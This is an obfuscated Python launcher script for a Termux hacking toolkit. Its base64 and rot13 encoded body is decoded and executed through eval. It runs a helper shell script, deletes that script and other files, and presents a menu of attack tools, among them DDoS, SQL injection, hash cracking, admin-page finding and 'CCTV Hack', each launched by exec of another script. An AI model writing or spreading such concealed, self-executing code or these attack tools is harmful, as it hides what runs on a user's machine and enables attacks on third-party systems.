#######################
#                     #
#        main         # MAIN FILE
#                     #
#####################################
#  Author: Mr Anonymous ############
#####################################
#                            #
#   CODER :  Mr Anonymous    #
#                            #
##############################



# Coded by Mr Anonymous
 

import base64, codecs
magic = 'CmltcG9ydCBvcyx0aW1lLHN5cyxtYXJzaGFsCgojVGV4dCBjb2xvdXIKI2NyZWF0ZWQgQnkgQ3JhY2tlcjkxMTE4MQpjb2xvdXJvZmY9Ilx4MWJbMDBtIiAjY29sb3VyIG9mZgoKcmVkPSJceDFiWzkxbSIgI3JlZApncmVlbj0iXHgxYls5Mm0iICNncmVlbgp5ZWxsb3c9Ilx4MWJbOTNtIiAjeWVsbG93CmJsdWU9Ilx4MWJbOTRtIiAjYmx1ZQpyb3N5PSJceDFiWzk1bSIgI3Jvc3kKcGVzdD0iXHgxYls5Nm0iICNwZXN0CgpyZWQxPSJceDFiWzE7OTFtIiAjcmVkCmdyZWVuMT0iXHgxYlsxOzkybSIgI2dyZWVuCnllbGxvdzE9Ilx4MWJbMTs5M20iICN5ZWxsb3cKYmx1ZTE9Ilx4MWJbMTs5NG0iICNibHVlCnJvc3kxPSJceDFiWzE7OTVtIiAjcm9zeQpwZXN0MT0iXHgxYlsxOzk2bSIgI3Blc3QKCgojIyMjIyMjIyMjIyMjIyMjIyMjIwoKZXhlYygob3BlbigiY250cmwucHkiLCJyIikpLnJlYWQoKSkKCm9zLnN5c3RlbSgic2ggcmVxdWlyZW1lbnQuc2giKQpvcy5zeXN0ZW0oInJtIC1yZiByZXF1aXJlbWVudC5zaCIpCm9zLnN5c3RlbSgicm0gLXJmIF9fcHljYWNoZV9fIikKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKCgpkZWYgY29udCgpOgoJd2hpbGUgVHJ1ZToKCQlvcy5zeXN0ZW0oJ2NsZWFyJykKCQlwcmludChyb3N5MSsiIiIKCQoJICAgICAgICAgICAgICAgICAgICAgMXwgRkIKCSAgICAgICAgICAgICAgICAgICAgIDJ8IFRlbGVncmFtCgkgICAgICAgICAgICAgICAgICAgICAzfCBHaXRIdWIKCSAgICAgICAgICAgICAgICAgICAgICIiIityZWQxKyIiIjR8IEJhY2sgVG8gSG9tZQoJIiIiKQoJCQoJCWNob3NlPXN0cihpbnB1dChyb3N5KyJcblxuRW50ZXIgWW91ciBPcHRpb246ICIpKQoJCgkJaWYgY2hvc2U9PSIxIjoKCQkJcHJpbnQoIlxuICBPcGVuaW5nIFVSTDogaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2NyYWNrZXI5MTExODEiKQoJCQlvcy5zeXN0ZW0oInRlcm11eC1vcGVuIGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9jcmFja2VyOTExMTgxIikKCQkJdGltZS5zbGVlcCgzKQoJCWVsaWYgY2hvc2U9PSIyIjoKCQkJcHJpbnQoIlxuICBPcGVuaW5nIFVSTDogaHR0cHM6Ly90Lm1lL2NyYWNrZXI5MTExODEiKQoJCQlvcy5zeXN0ZW0oInRlcm11eC1vcGVuIGh0dHBzOi8vdC5tZS9jcmFja2VyOTExMTgxIikKCQkJdGltZS5zbGVlcCgzKQoJCQoJCWVsaWYgY2hvc2U9PSIzIjoKCQkJcHJpbnQoIlxuICBPcGVuaW5nIFVSTDogaHR0cHM6Ly9naXRodWIuY29tL2NyYWNrZXI5MTExODEiKQoJCQlvcy5zeXN0ZW0oInRlcm11eC1vcGVuIGh0dHBzOi8vZ2l0aHViLmNvbS9jcmFja2VyOTExMTgxIikKCQkJdGltZS5zbGVlcCgzKQoJCQkKCQllbGlmIGNob3NlPT0iNCI6CgkJCWJyZWFrCgoKZGVmIHZvaWNlKCk6Cgl0ZXh0PXN0cihpbnB1dChyb3N5KyJcbkVudGVyIFlvdXIgVGV4dDogIikpCgl3aGlsZSBUcnVlOgoJCWxhbj1zdHIoaW5wdXQocm9zeSsiXG5FbnRlciBZb'
love = '3IlVRkuozq1LJqyXTI4LJ1joTH6VPqyov9vovpcBvNvXFxXPDycMvOfLJ49CFVvVT9lVTkuow09VvNvBtbWPDyjpzyhqPulMJDeVykhKT5pqRkuozq1LJqyVR5iqPORMJ5cMJDvXDbWPJIfp2H6PtxWPKMinJAyCJqHISZbqTI4qQ10MKu0YTkuozp9oTShXDbWPDyznJkyCKA0pvucoaO1qPtvKT5SoaEypvOMo3IlVRMcoTHtGzSgMFOTo3Vtp2S2nJ5aXTI4LJ1joTH6VUEyp3DhoKNmXGbtVvxcPtxWPKqbnJkyVSElqJH6PtxWPDyjLKEbCKA0pvucoaO1qPulo3A5XlWpoxIhqTIlVSyiqKVtH2S2nJ5aVSOuqTt6VPVcXDbWPDxWnJLtpTS0nQ09VvVto3VtpTS0nQ09VvNvBtbWPDxWPKOlnJ50XUWyMPfvKT5poyk0HTS0nPOBo3DtETIhnJIxVvxXPDxWPJIfp2H6PtxWPDxWoJ5jqQ1mqUVbpTS0nPfvYlVeMzyfMFxXPDxWPDy2o2ywMF5mLKMyXT1hpUDcPtbXPtcxMJLtqzZbXGbXPKqbnJkyVSElqJH6PtxWpUWcoaDbLzk1MFgzVvVvPvNtVS9sK18tVPNtVPNtVPNtVPNtVPNtKlNtVPNtVPNtVPNtVPNtVPOsK19sKlNtVPNtVPNtVPNtKjbtVP8tK19ssS8tK18tK18tKlNtK19ssPO8VS9sK19sVS8tK18tVPO8KlNtVS98K18tVPOsK18tsPO8PvNvVvVeLzk1MFfvVvW8VUjtVPO8VPWsKl8tK2NtsP8tK198VUjiVP8tKlOpVPWsK3ksK19ssPO8YlOsVSjtYlOsVSk8VUjXVPVvVvgjMKA0XlVvVajtsS9sK3jtsPO8VPussPO8VPusK3jtVPN8VPOsKl8tsPO8K19sK198VUjtXS8cVUjtXS8cVUjtsNbtVSksK19ssS98VPOpK18fK3kpK19ssS98KS9pK19ssS98VPNtVPNtVUkssSksK18iVSksK18isS98KT5povNvVvVeM3WyMJ4eVvVvVPNtVPNtVPNtVPNtVRAlLJAeVSyiqKVtI29loTDfVRyzVSyiqFOQLJ5poykhKUDtVPNtVPNtVPNtVPVvVvgvoUIyXlVvVyivzVIqVRyDVSEio2jtJ+XLuI0tKT4vVvVeM3WyMJ4eVvVvVQ09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CFVvVvgwo2kiqKWiMzLcPtxWL2uip2H9p3ElXTyhpUI0XUOyp3DeVykhKT5pqSk0ZF4tD29hqzIlqPOHMKu0VSEiVSMinJAyKT5pqSk0VvglMJDeVwNjYxWuL2ftIT8tFT9gMIkhKT4vX3Wip3xeVxIhqTIlVSyiqKVtG3O0nJ9hBvNvXFxXPDbWPJyzVTAbo3AyCG0vZFV6PtxWPKMinJAyXPxXPDyyoTyzVTAbo3AyCG0vZQNvBtbWPDyvpzIunjbWPDbXPtbwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVjbXqzIlp2yiow0vAP41VtbXPaqbnJkyVSElqJH6Ptyipl5mrKA0MJ0bVzAfMJSlVvxXPKOlnJ50XTWfqJHkX2LvVvVXVPNtK19sKlNtVPNtVPNtVPNtVPNtVPOsVPNtVPNtVPNtVPNtVPNtVS9sK19sVPNtVPNtVPNtVPOsPvNtYlOsK198KlOsKlOsKlOsVPOsK198VUjtK19sK18tKlOsKlNtVUksVPNtK3ksKlNtVS9sKlO8VUjXVPVvVvgvoUIyZFfvVvW8VUjtVPO8VPWsKl8tK2NtsP8tK198VUjiVP8tKlOpVPWsK3ksK19ssPO8YlOsVSjtYlOsVSk8VUjXVPVvVvgjMKA0ZFfvVv'
god = 'J8IHxfX198IHwgfCAoX3wgfCAoX198ICAgPCAgX18vIHwgfF9fX19ffCB8IChfKSB8IChfKSB8IHwKICBcX19fX3xffCAgXF9fLF98XF9fX3xffFxfXF9fX3xffCAgICAgICB8X3xcX19fLyBcX19fL3xffFxuXG4gIiIiK2dyZWVuMSsiIiIgICAgICAgICAgICAgQ3JhY2sgWW91ciBXb3JsZCwgSWYgWW91IENhblxuXG5cdFx0ICAgICAgIiIiK3llbGxvdzErIiIiVmVyc2lvbjoiIiIrcmVkMSt2ZXJzaW9uKyIiIiIiIitjb2xvdXJvZmYpCgkKCQoJY2hvb3NlPXN0cihpbnB1dChwZXN0MSsiIiJcbgpcdHw9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PXwKXHR8IiIiK3llbGxvdzErIiIiIDEuQ29udGFjdCBJbmZvIiIiK3Blc3QxKyIiIiAgICAgIDIuSVAgVG9vbCAgICAgICAgfApcdHwgMy5TdWJkb21haW4gU2Nhbm5lciA0LkRkb3MgQXR0YWNrICAgIHwKXHR8IDUuQWRtaW4gRmluZGVyICAgICAgNi5IYXMgQ3JhY2tlciAgICB8Clx0fCA3LlZpZGVvIERvd25sb2FkZXIgIDguQkQgQ2xvbmVyICAgICAgfApcdHwgOS5TUUwtSW5qZWN0aW9uICAgIDEwLlRleHQgVG8gVm9pY2UgIHwKXHR8MTEuUHl0aG9uIE9iZnVzY2F0ZSAxMi5UZWxlZ3JhbSBLaXQgICB8Clx0fDEzLlRlcm11eCBGcmFtZXdvcmsgMTQuS2FsaSBOZXRodW50ZXIgfApcdHwxNS5UZXJtdXggVG9vbCAgICAgIDE2LlVSTCBDaGFuZ2VyICAgIHwKXHR8MTcuVVJMIFNob3J0bmVyICAgICAxOC5XRUIgVG9vbCAgICAgICB8Clx0fDE5LlRlbXAgTWFpbCAgICAgICAgMjAuR2VuYXJhdGUgR01BSUwgfApcdHwyMS5DQ1RWIEhhY2sgICAgICAgICAgICAgICAgICAgICAgICAgIHwKXHR8ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8Clx0fCIiIitncmVlbjErIiIiIDg4LlVwZGF0ZSBDcmFja2VyLVRvb2wiIiIrcmVkMSsiIiIgICAgOTkuRXhpdCIiIitwZXN0MSsiIiIgICAgfApcdHw9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PXwKXG4iIiIrcm9zeTErIiIiRW50ZXIgWW91ciBPcHRpb246ICIiIikpCgoJCglpZiBjaG9vc2U9PSI5OSI6CgkJb3Muc3lzdGVtKCJjbGVhciIpCgkJcHJpbnQoeWVsbG93KyJcblxuXG5cblxuXG5cdFx08J+kqVRoYW5rcyBGb3IgVXNpbmcgTXkgVG9vbPCfpKkgICBcblxuXG4iKQoJCXN5cy5leGl0KCkKCQoJCgllbGlmIGNob29zZT09IjEiOgoJCW9zLnN5c3RlbSgiY2xlYXIiKQoJCWNvbnQoKQoJCgllbGlmIGNob29zZT09IjIiOgoJCW9vPW9wZW4oImlwLnB5IiwiciIpCgkJZXhlYyhvby5yZWFkKCkpCgkKCWVsaWYgY2hvb3NlPT0iNCI6CgkJb289b3BlbigiZGRvcy5weSIsInIiKQoJCWV4ZWMob28ucmVhZCgpKQoJCgllbGlmIGNob29zZT09IjMiOgoJCW9vPW9wZW4oInN1YmRtLnB5IiwiciIpCgkJZXhlYyhvby5yZWFkKCkpCgkKCWVsaWYgY2hvb3NlPT0iNSI6CgkJb289b3BlbigiYWRtaW4ucHkiLCJyIikKCQlleGVjKG9'
destiny = 'iYaWyLJDbXFxXPDbWMJkcMvOwnT9ip2H9CFV2VwbXPDyiom1ipTIhXPWbLKZhpUxvYPWlVvxXPDyyrTIwXT9iYaWyLJDbXFxXPDbWMJkcMvOwnT9ip2H9CFV3VwbXPDyiom1ipTIhXPWxo3qhoTDhpUxvYPWlVvxXPDyyrTIwXT9iYaWyLJDbXFxXPDbWMJkcMvOwnT9ip2H9CFV4VwbXPDyiom1ipTIhXPWwoT9hMF5jrFVfVaVvXDbWPJI4MJZbo28hpzIuMPtcXDbWPtyyoTyzVTAbo29mMG09VwxvBtbWPJ9iCJ9jMJ4bVaAkoP1gov5jrFVfVaVvXDbWPJI4MJZbo28hpzIuMPtcXDbWPtyyoTyzVTAbo29mMG09VwRjVwbXPDyzpz9gVTq0qUZtnJ1jo3W0VTqHISZXPDbWPJ9mYaA5p3EyoFtvL2kyLKVvXDbWPKMwXPxXPDbWMJkcMvOwnT9ip2H9CFVkZFV6PtxWo289o3OyovtvpUDhpUxvYPWlVvxXPDyyrTIwXT9iYaWyLJDbXFxXPDbWMJkcMvOwnT9ip2H9CFVkZvV6PtxWo3Zhp3ymqTIgXPWloFNgpzLtK19jrJAuL2uyK18vXDbWPJ9iCJ9jMJ4bVaEfM20hpUxvYPWlVvxXPDyipl5mrKA0MJ0bVaWgVP1lMvOsK3O5L2SwnTIsKlVcPtxWMKuyLluiol5lMJSxXPxcPtxXPJIfnJLtL2uio3AyCG0vZGZvBtbWPJ9iCJ9jMJ4bVz1yqUZhpUxvXDbWPJI4MJZbo28hpzIuMPtcXDbWPtyyoTyzVTAbo29mMG09VwR0VwbXPDyiom1ipTIhXPWhMKDhpUxvYPWlVvxXPDyyrTIwXT9iYaWyLJDbXFxXPDbWMJkcMvOwnT9ip2H9CFVkAFV6PtxWo289o3OyovtvL3ImqT9sqP5jrFVfVaVvXDbWPJI4MJZbo28hpzIuMPtcXDbWPtyyoTyzVTAbo29mMG09VwR2VwbXPDyiom1ipTIhXPWwozqsqKVhpUxvYPWlVvxXPDyyrTIwXT9iYaWyLJDbXFxXPDbWMJkcMvOwnT9ip2H9CFVkAlV6PtxWo3Zhp3ymqTIgXPWjrKEbo24tY2EuqTRiMTS0LF9wo20hqTIloKI4Y2McoTImY2uioJHiD3WuL2gypv1Ho29fYl50MKA0Y2kmnT90YaO5VvxXPDbWMJkcMvOwnT9ip2H9CFVkBPV6PtxWo289o3OyovtvY2EuqTRiMTS0LF9wo20hqTIloKI4Y2McoTImY2uioJHiD3WuL2gypv1Ho29fYl50MKA0Y3qvMF5jrFVfVaVvXDbWPJI4MJZbo28hpzIuMPtcXDbWPtyyoTyzVTAbo29mMG09VwR5VwbXPDyiom1ipTIhXPViMTS0LF9xLKEuY2AioF50MKWgqKtiMzyfMKZinT9gMF9QpzSwn2IlYIEio2jiYaEyp3DiqTIgpP5jrFVfVaVvXDbWPJI4MJZbo28hpzIuMPtcXDbWPtyyoTyzVTAbo29mMG09VwVjVwbXPDyiom1ipTIhXPViMTS0LF9xLKEuY2AioF50MKWgqKtiMzyfMKZinT9gMF9QpzSwn2IlYIEio2jiYaEyp3DiMT90YaO5VvjvpvVcPtxWMKuyLluiol5lMJSxXPxcPtxWPtyyoTyzVTAbo29mMG09VwVkVwbXPDyiom1ipTIhXPViMTS0LF9xLKEuY2AioF50MKWgqKtiMzyfMKZinT9gMF9QpzSwn2IlYIEio2jiYaEyp3DiL2SgYaO5VvjvpvVcPtxWMKuyLluiol5lMJSxXPxcPtxXPDbWMJkcMvOwnT9ip2H9CFV4BPV6PtxWo3Zhp3ymqTIgXPWwnT1iMPNerPO1pP5mnPVcPtxWo3Zhp3ymqTIgXPVhY3IjYaAbVvxXPDymrKZhMKucqPtcPtxX'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
